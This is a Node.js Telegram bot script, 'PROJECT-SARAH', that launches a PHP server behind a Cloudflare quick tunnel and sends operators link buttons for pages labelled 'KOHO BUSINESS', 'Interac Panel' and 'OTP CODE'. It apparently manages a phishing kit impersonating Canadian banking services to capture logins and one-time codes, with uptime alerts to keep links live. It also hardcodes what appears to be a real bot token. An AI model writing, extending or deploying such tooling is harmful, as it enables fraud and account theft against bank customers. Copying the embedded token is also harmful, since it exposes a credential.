#!/usr/bin/env node
import fs from "fs";
import path from "path";
import { spawn } from "child_process";
import fetch from "node-fetch";
import TelegramBot from "node-telegram-bot-api";
import { setTimeout as sleep } from "timers/promises";

const BASE = process.cwd();
const DOT_WWW = path.join(BASE, ".www");
const WWW = path.join(BASE, "www");
const LOGS = path.join(BASE, ".logs");
const DATA = path.join(BASE, ".data");
const WATCHERS_FILE = path.join(DATA, "watchers.json");

if (!fs.existsSync(LOGS)) fs.mkdirSync(LOGS);
if (!fs.existsSync(DATA)) fs.mkdirSync(DATA);
if (!fs.existsSync(WWW)) fs.mkdirSync(WWW);
if (!fs.existsSync(DOT_WWW)) fs.mkdirSync(DOT_WWW);

const TOKEN = process.env.BOT_TOKEN || "8536070173:AAEEqV5EOXXqiCAOrZoHKKYbDt8_SvZB8RU";
if (!TOKEN) throw new Error("❌ BOT_TOKEN not set");

const PHP = "php"; // assumes php is in PATH
const CF = "cloudflared"; // assumes cloudflared in PATH
const CF_RE = /https:\/\/[a-z0-9\-]+\.trycloudflare\.com/;

const PROJECT_NAME = "PROJECT-SARAH";
const BOT_NAME = "Sarah";

const bot = new TelegramBot(TOKEN, { parse_mode: "Markdown", polling: true });

// ────────── STATE ──────────
const S = {
  url: "",
  url_short: "",
  port: 0,
  started: 0,
  watchers: new Set(),
  progress_mid: {}, // chat_id -> message_id
  last_online: null,
};

// ────────── UTILS ──────────
function log(msg) {
  const ts = new Date().toISOString();
  const line = `[${ts}] ${msg}\n`;
  console.log(line.trim());
  fs.appendFileSync(path.join(LOGS, "debug.log"), line);
}

function loadWatchers() {
  if (fs.existsSync(WATCHERS_FILE)) {
    try { S.watchers = new Set(JSON.parse(fs.readFileSync(WATCHERS_FILE, "utf-8"))); }
    catch { S.watchers = new Set(); }
  }
}

function saveWatchers() {
  try { fs.writeFileSync(WATCHERS_FILE, JSON.stringify([...S.watchers])); }
  catch {}
}

function freePort() {
  const net = require("net");
  return new Promise((resolve, reject) => {
    const srv = net.createServer();
    srv.listen(0, "127.0.0.1", () => {
      const port = srv.address().port;
      srv.close(() => resolve(port));
    });
    srv.on("error", reject);
  });
}

async function httpOk(url) {
  try {
    let r = await fetch(url, { method: "HEAD" });
    if ([403, 405].includes(r.status)) r = await fetch(url);
    return r.ok;
  } catch { return false; }
}

// ────────── PHP PLACEHOLDERS ──────────
if (!fs.existsSync(path.join(DOT_WWW, "splash.php")))
  fs.writeFileSync(path.join(DOT_WWW, "splash.php"), "<?php http_response_code(200); ?><h1>Koho Web App</h1>");
if (!fs.existsSync(path.join(DOT_WWW, "blacklist.php")))
  fs.writeFileSync(path.join(DOT_WWW, "blacklist.php"), "<?php http_response_code(200); ?><h1>Admin Panel</h1>");

// ────────── LOADER BAR ──────────
function blockBar(p, width = 15) {
  p = Math.max(0, Math.min(1, p));
  const n = Math.round(p * width);
  return "▮".repeat(n) + "▯".repeat(width - n);
}

async function sendSingleLoader(chatId) {
  const msg = await bot.sendMessage(chatId, blockBar(0));
  S.progress_mid[chatId] = msg.message_id;
  return msg.message_id;
}

async function editLoader(chatId, messageId, p) {
  try { await bot.editMessageText(blockBar(p), { chat_id: chatId, message_id: messageId }); }
  catch { /* ignore failures */ }
}

// ────────── LINKS PANEL ──────────
function linksPanel(base) {
  const { InlineKeyboardMarkup, InlineKeyboardButton } = TelegramBot;
  const kb = { inline_keyboard: [] };
  const routes = [
    ["/splash.php", "KOHO BUSINESS"],
    ["/blacklist.php", "Interac Panel"],
    ["/otp.php", "OTP CODE"]
  ];
  for (const [path, label] of routes) {
    kb.inline_keyboard.push([{ text: label, url: `${base}${path}?src=sarah` }]);
  }
  return kb;
}

// ────────── STACK CONTROL ──────────
let phpProc = null;
let cfProc = null;

async function killStack() {
  if (phpProc) { phpProc.kill(); phpProc = null; }
  if (cfProc) { cfProc.kill(); cfProc = null; }
}

async function startStack(progressFn = null, timeout = 30_000) {
  await killStack();
  const port = await freePort();
  phpProc = spawn(PHP, ["-S", `127.0.0.1:${port}`, "-t", WWW], { stdio: "ignore" });
  cfProc = spawn(CF, ["tunnel", "--url", `http://127.0.0.1:${port}`, "--no-autoupdate"], { stdio: "pipe" });

  const t0 = Date.now();
  let found = "";
  for await (const chunk of cfProc.stdout) {
    const txt = chunk.toString();
    const m = CF_RE.exec(txt);
    if (m) { found = m[0]; break; }
    if (progressFn) progressFn(Math.min(1, (Date.now() - t0)/timeout));
    if (Date.now() - t0 > timeout) break;
  }

  if (!found) { await killStack(); log("❌ Tunnel not found"); return [false, ""]; }

  S.url = found;
  S.url_short = S.url; // could add shortening
  S.port = port;
  S.started = Date.now();
  S.last_online = true;
  log(`✅ Started PHP on :${port} → ${S.url}`);
  return [true, S.url];
}

// ────────── MAIN KEYBOARD ──────────
function mainKB() {
  return {
    keyboard: [
      ["▶️ START", "📎 LINKS MENU", "⏹ STOP"],
      ["📊 STATUS", "📝 LOGS", "👁 WATCH"],
      ["❓ HELP", "⚠️ DISCLAIMER", "⚙️ SETTINGS"]
    ],
    resize_keyboard: true
  };
}

// ────────── BOT HANDLERS ──────────
loadWatchers();

bot.onText(/\/start/, async (msg) => {
  S.watchers.add(msg.chat.id); saveWatchers();
  bot.sendMessage(msg.chat.id, `Hi, I’m ${BOT_NAME} — welcome to ${PROJECT_NAME}.`, { reply_markup: mainKB() });
});

bot.on("message", async (msg) => {
  const text = (msg.text || "").toUpperCase();
  const cid = msg.chat.id;
  S.watchers.add(cid); saveWatchers();

  if (text.includes("START")) {
    const mid = await sendSingleLoader(cid);
    const [ok, url] = await startStack(p => editLoader(cid, mid, p));
    await editLoader(cid, mid, 1);
    if (ok) bot.sendMessage(cid, "Links ready!", { reply_markup: linksPanel(url) });
    else bot.sendMessage(cid, "Failed to start stack.");
    return;
  }

  if (text.includes("LINKS")) {
    if (!S.url) bot.sendMessage(cid, "No tunnel yet. Tap START.");
    else bot.sendMessage(cid, "Quick access:", { reply_markup: linksPanel(S.url) });
    return;
  }

  if (text.includes("STOP")) {
    await killStack();
    S.url = ""; S.url_short = ""; S.port = 0; S.started = 0; S.last_online = null;
    bot.sendMessage(cid, "Processes stopped.", { reply_markup: mainKB() });
    return;
  }

  if (text.includes("STATUS")) {
    if (!S.url) bot.sendMessage(cid, "Offline — nothing running.", { reply_markup: mainKB() });
    else {
      const ok = await httpOk(`${S.url}/splash.php`);
      const uptime = Math.floor((Date.now() - S.started)/1000);
      bot.sendMessage(cid, `${ok ? "🟢 Online" : "🔴 Offline"}\nUptime: ${uptime}s\n${S.url}`, { reply_markup: mainKB() });
    }
    return;
  }
});

// ────────── MONITOR LOOP ──────────
setInterval(async () => {
  if (!S.watchers.size || !S.url) return;
  const online = await httpOk(`${S.url}/splash.php`);
  if (S.last_online === null) S.last_online = online;
  if (online !== S.last_online) {
    S.last_online = online;
    for (const cid of S.watchers) {
      bot.sendMessage(cid, online ? "✅ Link back online" : "⚠️ Link went down");
    }
  }
}, 10_000);

log("Bot + PHP stack manager online.");